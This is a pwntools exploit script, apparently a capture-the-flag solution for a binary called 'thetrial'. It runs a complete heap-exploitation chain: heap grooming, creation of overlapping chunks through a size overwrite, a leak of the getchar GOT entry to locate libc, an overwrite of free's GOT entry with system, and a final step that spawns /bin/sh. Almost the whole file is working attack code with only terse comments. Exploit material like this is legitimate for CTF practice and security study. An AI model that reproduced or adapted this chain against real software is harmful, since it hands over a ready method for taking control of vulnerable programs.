#!/bin/python2
# exploit thetrial
# by N4T_20

from pwn import *
from time import sleep

local = False
debug = False

if local:
    if debug:
        p = gdb.debug('./thetrial', '''
            break *0x400d0c
            continue
            ''')
        # 0x400a1a: after get a free index
        # 0x400d9b: cast spell
    else:
        p = process('./thetrial')
else:
    p = remote('localhost', 5000)

def combine_spells(index1, index2):
    p.send("2\n")
    p.recvuntil("> ")
    p.send(str(index1) + "\n")
    p.recvuntil("> ")
    p.send(str(index2) + "\n")
    p.recvuntil("> ")

def delete_spell(index):
    p.send("3\n")
    p.recvuntil("> ")
    p.send(str(index) + "\n")
    p.recvuntil("> ")

def edit_spell(index, name):
    p.send("4\n")
    p.recvuntil("> ")
    p.send(str(index) + "\n")
    p.recvuntil("New name: ")
    p.send(name) # no newline
    p.recvuntil("> ")

p.recvuntil("> ")
# Want: 16 Mordenkainens in length for name. That gives me 0x220.
def allocate_0x220():
    combine_spells(15,15) # index 16: 68
    combine_spells(17,17) # index 18: 136
    combine_spells(18,18) # index 19: 272 = 0x110
    combine_spells(19,19) # index 20: 0x220




allocate_0x220()
combine_spells(8,8) # index 21: 24 characters


for i in range(10):
    combine_spells(20, 6) # 0x227 11) # indices 22-31: 0x236 # 0x227

combine_spells(15, 16) # 38 index 32
combine_spells(15, 17) # 0xcc index 33
combine_spells(33, 16) # 0xce index 34

for i in range(6): # 8
    delete_spell(22+i)

#p.interactive()
delete_spell(0)
delete_spell(1)
delete_spell(2)
delete_spell(3)
#p.interactive()
delete_spell(4)
delete_spell(5)
delete_spell(6)
delete_spell(7)
delete_spell(9)
#delete_spell(10)
delete_spell(11)
delete_spell(12)
delete_spell(13)
delete_spell(14)
delete_spell(15)


#p.interactive()
combine_spells(20, 21) # index 0 # 5, 0x238 # So instead of 9, I want 24...
combine_spells(20, 10) # index 1 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 2 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 3 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 4 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 5 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 6 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 7 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 9 # 6, 0x229 # Chunk to be freed. 
combine_spells(20, 21) # index 11 # 6, 0x238 # Chunk to be freed Index 11 points to +0x5190. It's 0x240 in length. Shrink to 0x200. 
combine_spells(20, 10) # index 12, 0x229
combine_spells(20, 10) # index 13, 0x229
combine_spells(20, 10) # index 14, 0x229
combine_spells(18, 18) # index 15, 0x110. 0x120 gets malloced.
combine_spells(17, 17) # index 22, 0x88. Top of heap.

#p.interactive()

# Delete the 0x240 chunks
delete_spell(0)
delete_spell(1)
delete_spell(2)
delete_spell(3)
delete_spell(4)
delete_spell(5)
delete_spell(6)
delete_spell(7)
#delete_spell(9)
#delete_spell(11)
#p.interactive()

# Need to fill up the 0x120 tcache
#p.interactive()
for i in range(9):
    combine_spells(18,18) # indices 0-7, 23

## Fill up all the 0x20-sized free chunks

combine_spells(18, 18) # 0x120, 24
combine_spells(18, 18) # 0x120, 25
combine_spells(18, 18) # 0x120, 26
combine_spells(18, 18) # 0x120, 27
combine_spells(18, 18) # 0x120, 35
combine_spells(18, 18) # 0x120, 36
combine_spells(18, 18) # 0x120, 37
combine_spells(18, 18) # 0x120, 38
combine_spells(18, 18) # 0x120, 39
combine_spells(18, 18) # 0x120, 40
combine_spells(18, 18) # 0x120, 41
combine_spells(18, 18) # 0x120, 42
combine_spells(18, 18) # 0x120, 43
combine_spells(18, 18) # 0x120, 44
combine_spells(18, 18) # 0x120, 45
combine_spells(18, 18) # 0x120, 46
combine_spells(18, 18) # 0x120, 47
#p.interactive()
 # 24-27, 35

#delete_spell(11)
payB = "B"*0x1f0
payB += p64(0x200)
payB += "C"*(0x229 - len(payB))
edit_spell(12, payB)
delete_spell(12)
#delete_spell(13)
edit_spell(11, "A"*0x238) # add 0x4b20 # 0x5190 to get to the chunk
#p.interactive()

combine_spells(18, 18) # index 12, 0x110
#combine_spells(17,17) # index 24, 0x88
#p.interactive()
## I need to put an 0x20 chunk right here, so I need to fill up the used chunks now
combine_spells(33, 16) # 0xce index 48, 49 # index 34


#payload = "D"*0x118 + p64(0x21) + p64(0x8) + p64(GOT_STRLEN) + "B"*8 + p64(0x81) + "D"*16
#ATOI_GOT_ADDR = 0x603080
#GETCHAR_GOT_ADDR = 0x603060




#p.interactive()
# Delete seven 0x110s
delete_spell(2)
#p.interactive()
delete_spell(3)
delete_spell(4)
delete_spell(5)
delete_spell(6)
delete_spell(7)
delete_spell(23)
#delete_spell(34)


# This creates two overlapping free spaces
delete_spell(12)
delete_spell(13) #("corrupted size vs. prev_size")
#delete_spell()

#p.interactive()

# malloc something really big.
combine_spells(14, 14) # index 2, alloc 0x460 or so


ATOI_GOT_ADDR = 0x603080
GETCHAR_GOT_ADDR = 0x603058
read_payload = "D"*0x110 + p64(0x120) + p64(0x20) + p64(0x6a) + p64(GETCHAR_GOT_ADDR) + "B"*8 + p64(0x81) + "D"*16
edit_spell(2, read_payload) # add 0x4b20 # 0x5190 to get to the chunk

# Leak GOT
p.send("1\n")
p.recv(0x1000)
p.recv(0x1000)
p.send("4\n") # starting the "edit spell"
p.recvuntil("48) ")
#p.interactive()
#p.recvuntil("48) Spell: ")
getchar_addr = p.recv(6) + "\x00\x00"
print("getchar_addr = " + str(getchar_addr))
GETCHAR_ADDR = u64(getchar_addr)
print(hex(GETCHAR_ADDR))

if local:
    LIBC_OFFSET = 0x87f70
    SYSTEM_OFFSET = 0x4f4e0
else:
    LIBC_OFFSET = 0x87f70
    SYSTEM_OFFSET = 0x4f4e0

SYSTEM_ADDR = GETCHAR_ADDR - LIBC_OFFSET + SYSTEM_OFFSET

FREE_GOT_ADDR = 0x603018
write_payload = "E"*0x110 + p64(0x120) + p64(0x20)
write_payload += p64(0x8) # length
write_payload += p64(FREE_GOT_ADDR) + "B"*8 + p64(0x81) + "D"*16 # p64(ATOI_GOT_ADDR) + "B"*8 + p64(0x81) + "D"*16
p.recvuntil("> ")
p.send("2\n")
p.recvuntil("> ")
p.send(write_payload + "\n")
#edit_spell(2, write_payload)
edit_spell(48, p64(SYSTEM_ADDR))

edit_spell(30, "/bin/sh\x00")

# Profit!
p.send("3\n")
p.recvuntil("> ")
p.send(str(30) + "\n")


p.interactive()




#combine_spells(17, 17)
#combine_spells(18, 18) # 0x110
#combine_spells(18, 18) # 0x110
#combine_spells(18, 18) # 0x110
#combine_spells(18, 18) # 0x110
#combine_spells(18, 18) # 0x110
#combine_spells(18, 18) # 0x110
#combine_spells(18, 18) # 0x110
#combine_spells(18, 18) # 0x110
#combine_spells(18, 18) # 0x110
#combine_spells(18, 18) # 0x110

#combine_spells(20, 10) # index 0 # 6, 0x229 # Chunk to be freed. This writes into free chunk...

#combine_spells(20, 10) # index 1 # 6, 0x229 # Chunk to be freed
#combine_spells(20, 10) # index 2 # 6, 0x229 # Chunk to be freed
#combine_spells(20, 10) # index 3 # 6, 0x229 # Chunk to be freed
#combine_spells(20, 10) # index 4 # 6, 0x229 # Chunk to be freed
#combine_spells(20, 10) # index 5 # 6, 0x229 # Chunk to be freed




#combine_spells(18, 18) # spell 0, 0x110
#combine_spells(17, 17) # spell 1, 0x88

#delete_spell(7)
#delete_spell(9)
#delete_spell(1) # should have a free chunk of size 0x229 --> 0x230
#edit_spell(5, "A"*0x238)
#delete_spell(21)
#sleep(20)
#edit_spell(20, "A"*0x220)

p.interactive()
